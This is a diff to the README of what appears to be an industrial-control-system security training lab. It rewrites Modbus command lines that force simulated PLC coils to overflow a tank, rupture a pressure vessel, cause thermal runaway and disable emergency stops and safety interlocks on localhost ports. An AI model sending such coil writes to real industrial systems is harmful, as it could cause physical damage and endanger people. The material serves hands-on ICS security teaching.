@@ -55,17 +55,17 @@ firefox http://localhost:5000  # PLC-1
 pip install modbus-cli
 
 # PLC-1: Force tank overflow (coil 0 = pump1, coil 3 = valve1)
-sudo modbus write-coil 127.0.0.1:5502 0 1    # Pump ON
-sudo modbus write-coil 127.0.0.1:5502 3 0    # Valve CLOSED
+modbus-cli localhost 5502 write coil 0 1    # Pump ON
+modbus-cli localhost 5502 write coil 3 0    # Valve CLOSED
 
 # PLC-2: Pressure spike (coil 0 = compressor1)
-sudo modbus write-coil 127.0.0.1:5503 0 1    # Compressor ON
+modbus-cli localhost 5503 write coil 0 1    # Compressor ON
 
 # PLC-3: Thermal runaway (coil related to heaters)
-sudo modbus write-coil 127.0.0.1:5504 0 1    # Heater ON
+modbus-cli localhost 5504 write coil 0 1    # Heater ON
 
 # PLC-4: Disable safety (coil 0 = emergency stop)
-sudo modbus write-coil 127.0.0.1:5505 0 0    # Emergency stop OFF
+modbus-cli localhost 5505 write coil 0 0    # Emergency stop OFF
 
 # Watch the consequences on HMI: http://localhost:8000 (local) or check PLC web interfaces (Docker)
 ```
@@ -135,8 +135,8 @@ The demo scripts help you see the **cause-and-effect** relationship:
 ```
 Terminal (Cause)                    Browser (Effect)
 ─────────────────────              ─────────────────────
-modbus write-coil                   Pump 1 Status: false
-127.0.0.1:5502 0 1     ──────►     Changes to TRUE ✓
+modbus-cli localhost                Pump 1 Status: false
+5502 write coil 0 1    ──────►     Changes to TRUE ✓
 (Turn pump ON)                      (Visible in 2 seconds)
 ```
 
@@ -505,31 +505,31 @@ python3 attack.py
 **Tank Overflow (PLC-1 - Visual Impact):**
 ```bash
 # Open HMI: http://localhost:8000
-sudo modbus write-coil 127.0.0.1:5502 0 1   # Force pump ON (coil 0)
-sudo modbus write-coil 127.0.0.1:5502 3 0   # Force valve CLOSED (coil 3)
+modbus-cli localhost 5502 write coil 0 1   # Force pump ON (coil 0)
+modbus-cli localhost 5502 write coil 3 0   # Force valve CLOSED (coil 3)
 # Watch tank overflow in real-time!
 ```
 
 **Pressure Vessel Rupture (PLC-2):**
 ```bash
-sudo modbus write-coil 127.0.0.1:5503 0 1   # Compressor ON (coil 0)
-sudo modbus write-coil 127.0.0.1:5503 4 0   # Relief valve CLOSED (coil 4)
+modbus-cli localhost 5503 write coil 0 1   # Compressor ON (coil 0)
+modbus-cli localhost 5503 write coil 4 0   # Relief valve CLOSED (coil 4)
 # Pressure rises until rupture
 ```
 
 **Thermal Runaway (PLC-3):**
 ```bash
 # Control heaters/coolers via coils
-sudo modbus write-coil 127.0.0.1:5504 0 1   # Heater 1 ON (coil 0)
-sudo modbus write-coil 127.0.0.1:5504 2 0   # Cooler 1 OFF (coil 2)
+modbus-cli localhost 5504 write coil 0 1   # Heater 1 ON (coil 0)
+modbus-cli localhost 5504 write coil 2 0   # Cooler 1 OFF (coil 2)
 # Temperature rises uncontrollably
 ```
 
 **Safety System Bypass (PLC-4):**
 ```bash
 # Disable safety via coils (digital outputs)
-sudo modbus write-coil 127.0.0.1:5505 0 0   # Disable emergency stop
-sudo modbus write-coil 127.0.0.1:5505 1 0   # Disable safety interlock
+modbus-cli localhost 5505 write coil 0 0   # Disable emergency stop
+modbus-cli localhost 5505 write coil 1 0   # Disable safety interlock
 # All safety systems now bypassed - catastrophic!
 ```
 
@@ -592,7 +592,7 @@ This gives you immediate hands-on experience and shows the cause-and-effect rela
 
 5. **Modbus Manipulation:** Send unauthorized commands
    ```bash
-   sudo modbus 127.0.0.1:5502 write 0 1  # Force pump ON
+   modbus-cli localhost 5502 write coil 0 1  # Force pump ON
    ```
 
 6. **Information Disclosure:** Exploit directory traversal and verbose errors
